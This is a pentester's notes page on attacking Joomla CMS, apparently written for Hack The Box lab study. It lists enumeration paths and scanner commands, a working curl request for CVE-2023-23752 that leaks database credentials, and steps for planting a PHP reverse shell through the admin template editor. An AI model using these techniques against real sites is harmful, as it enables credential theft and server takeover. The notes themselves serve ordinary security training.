# Joomla CMS

[![attacking_common_applications](../../../../../cybersecurity/_badges/htb/attacking_common_applications.svg)](https://academy.hackthebox.com/course/preview/attacking-common-applications)

<div class="row row-cols-lg-2"><div>

[Joomla](https://www.joomla.org/) is an open-source Content Management System (CMS) written in PHP. The version 5 is currently in development (2024).

* [GitHub](https://github.com/joomla/joomla-cms) <small>(4.4k ⭐)</small>
* [Documentation](https://github.com/joomla/joomla-cms) <small>(⛪)</small>

The admin page default path is: `/administrator`.
</div><div>
</div></div>

<hr class="sep-both">

## Joomla Pentester Notes ☠️

[![attacking_common_applications](../../../../../cybersecurity/_badges/htb/attacking_common_applications.svg)](https://academy.hackthebox.com/course/preview/attacking-common-applications)
[![devvortex](../../../../../cybersecurity/_badges/htb-p/devvortex.svg)](https://app.hackthebox.com/machines/Devvortex)

<div class="row row-cols-lg-2"><div>

The `/robots.txt` file may contain the list of interesting paths. If the website was not properly configured, `/README.txt` may be accessible.

* OWASP initiated the development of [joomscan](https://github.com/OWASP/joomscan) <small>(1.0k ⭐)</small>

```ps
$ sudo apt install joomscan
$ joomscan -u URL
[+] Detecting Joomla Version
[++] Joomla x.y.z

<SNIP... Nothing of interest>
```

* You can try to use [droopescan](/cybersecurity/red-team/tools/scanners/web/droopescan.md) <small>(not really useful)</small>

```ps
$ droopescan scan joomla --url URL
```
</div><div>

* [CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752): Exposed credentials `[4.0.0, 4.2.7]`. See also: [PoC (ruby)](https://github.com/Acceis/exploit-CVE-2023-23752) <small>(0.05k ⭐)</small> or manual exploitation:

```ps
$ curl -v URL/api/index.php/v1/config/application?public=true
"dbtype": "mysqli",
"host": "localhost",
"user": "xxx",
"password": "yyy"
"db": "joomla",
```

* When logged as administrator, you can upload a [reverse shell](/cybersecurity/red-team/s3.exploitation/shell/reverse_shell.md):

Go in System > Site Templates > Click on a template.
Create a new file or upload one if you can. You can copy-paste a shell:

```ps
$ cat revshell.php | xclip -selection clipboard
```

The file path is shown in the editor, while, for reference, mine was at the URL:  `URL/templates/<your_selected_site_name>/revshell.php`.
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* `/images`, `/home`, `/media`, `/templates`, `/modules`
* `/plugins`, `/includes`, `/language`, `/components`, `/api`
* `/cache`, `/libraries`, `/tmp`, `/layouts`, `/administrator`
* `/media/templates/site/<name>/assets/`
</div><div>
</div></div>